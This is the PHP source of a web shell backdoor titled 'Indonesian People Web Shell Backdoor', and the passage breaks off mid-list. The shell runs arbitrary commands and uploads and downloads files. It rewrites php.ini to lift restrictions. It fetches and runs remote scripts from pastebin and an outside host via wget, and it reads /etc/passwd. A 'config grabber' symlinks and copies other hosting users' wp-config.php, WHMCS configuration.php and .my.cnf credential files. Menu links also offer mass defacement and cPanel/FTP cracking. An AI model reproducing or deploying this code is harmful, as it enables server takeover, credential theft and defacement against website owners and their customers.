<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$phi = fopen("php.ini","w+");
fwrite($phi,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>Indonesian People Web Shell Backdoor</title>
<link href='http://azzat.wap.mu/favicon.ico' rel='shortcut icon' alt='icon'>
<meta name='author' content='AZZATSSINS'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>
</head>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}

if(get_magic_quotes_gpc()) {
	function azzatssinsx($array) {
		return is_array($array) ? array_map('azzatssinsx', $array) : stripslashes($array);
	}
	$_POST = azzatssinsx($_POST);
	$_COOKIE = azzatssinsx($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

if($_GET['server'] == 'info') {
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo"Config File: "; if(is_readable("/etc/named.conf")){

echo '[<font color=lime>/etc/named.conf</font>] ';

}else{

echo '[<font color=red>/etc/named.conf</font>] ';

}

if(is_readable("/etc/passwd")){

echo '[<font color=lime>/etc/passwd</font>] ';

}else{

echo '[<font color=red>/etc/passwd</font>] ';

}

if(is_readable("/etc/valiases")){

echo '[<font color=lime>/etc/valiases</font>] ';
}else{

echo '[<font color=red>/etc/valiases</font>] ';

}

if(is_readable("/var/named")){

echo '[<font color=lime>/var/named</font>] ';
}else{

echo '[<font color=red>/var/named</font>] ';

}
echo "<br>Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
}
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]<br>";
	echo "<center></fieldset>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo "</fieldset></center><br>";
echo "<center>";
echo "<fieldset><ul><b>";
echo "<li>[ <a href='?'>HOME</a> ]</li>";
echo "<li>[ <a href='?server=info'>SERVER INFO</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=whmcs'>WHMCS DECODER</a> ]</li>";
echo "<li>[ <a href='?whmcs=killer'>WHMCS KILLER</a> ]</li>";
echo "<li>[ <a href='?whmcs=remote'>WHMCS REMOTE</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>AUTO MASS</a> ]</li>";
echo "<li>[ <a href='?config=grabber'>CONFIGS</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>JUMPING</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPFTP CRACK</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mirror'>MIRROR</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgi'>PERL5HELL</a> ]</li>";
echo "<li>[ <a href='?mysql=connect'>MYSQL</a> ]</li><br>";
echo "<li>[ <a href='?symbolic=link'>SYMLINK</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>CHANGE USER</a> ]</li>";
echo "<li>[ <a style='color: red;' href='?kill=self'>KILLSELF</a> ]</li>";
echo "</b></ul></fieldset>";
echo "</center>";
echo "<br><fieldset>";
	echo "<form method='post'>
<font style='text-decoration: underline;'>Command : </font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='azx' value='>>'>
	</form>	";
	if(isset($_POST['azx']))
{
 
echo'<br><div style="background:#6d6d6d;margin:0px;padding:1px;text-align:left;color:lime;"><pre>';
$cmd = $_POST['cmd'];
if($cmd == "")
{
 
echo "Please Insert Command!";
 }
 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div><br><br>';
}
echo "</fieldset><br>";
if($_GET['whmcs'] == 'killer') {
echo'<form method="post">
<center>
<br><u>Input WHMCS configuration.php</u><br><textarea style="color:red;background-color:#000000" cols="60" name="azztssns" rows="20"></textarea><br><input style="color:red;background-color:#000000" name="conf" size="10"
 value="Fuck it!!!" type="submit">
<br/><br/></form></center>';
if ($_POST['conf']) {
$configuration = $_POST['azztssns'];
file_put_contents("configuration.php",$configuration,FILE_APPEND);
$scr = file_get_contents("http://pastebin.com/raw/31kP3Dp8");
$fel = fopen("wk.php", "w");
fwrite($fel, $scr);
system('wget -O wk.php http://pastebin.com/raw/31kP3Dp8');
echo'<meta http-equiv="Refresh" content= "0; url=wk.php">';
}
}
if($_GET['whmcs'] == 'remote') {
echo'<meta http-equiv="Refresh" content= "0; url=http://whmremote.us.to">';
}
if($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('azx', 0755);
	$file_cgi = "azx/cgi.pl";
	$isi_htcgi = "AddHandler cgi-script .pl";
	$htcgi = fopen(".htaccess", "w");
$cgi_script = file_get_contents("http:/x-x-x.yn.lt/pl.css");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
system('wget -O azx/cgi.pl www.x-x-x.yn.lt/pl.css');system('chmod 0755 cgi.pl');
echo'<meta http-equiv="Refresh" content= "0; url=azx/cgi.pl">';
 }
if($_GET['mysql']=="connect"){
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('mysql.php')) {
		echo "<center><font color=lime><a href='mysql.php' target='_blank'>KLICK DI SINI</a></font></center>";
	} else {
		if(adminer("http://pastebin.com/raw/hN2nDPuH","mysql.php")) {
			echo "<center><font color=lime><a href='mysql.php' target='_blank'>-> KLICK DI SINI <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}
if($_GET['config']=="grabber"){
@error_reporting(0);
@ini_set('html_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
echo'<center><div style=background:black;margin:0px;padding:4px;text-align:center;color:silver;><i><b><font color=lime>&copy; </font><a href=http://fb.me/AZZATSSINS.CYBERSERKERS>AZZATSSINS CYBERSERKERS</a></b></i></div><br>
<form method="post">
<center>
<textarea style="color:red;background-color:#000000" cols="60" name="passwd" rows="20">';
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) 
{ 
$str=explode(":",$usrr); 
echo $str[0]."\n"; 
}
echo system('ls /var/mail');
echo system('ls /home');

echo'</textarea><br>
Home : 
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
</select><br>
.htaccess : 
<select name="azztssns">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex azzatssins.cyberserkers
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select>
<input style="color:red;background-color:#000000" name="conf" size="10"
 value="Fuck it!!!" type="submit">
<br/><br/></form>';
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess = $_POST['azztssns'];
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]); 
foreach($passwd as $pwd){ $user=trim($pwd);
symlink('/','000~ROOT~000');
copy('/'.$home.'/'.$user.'/.my.cnf',$user.' <~ CPANEL');
symlink('/'.$home.'/'.$user.'/.my.cnf',$user.' <~ CPANEL');
copy('/'.$home.'/'.$user.'/.accesshash',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
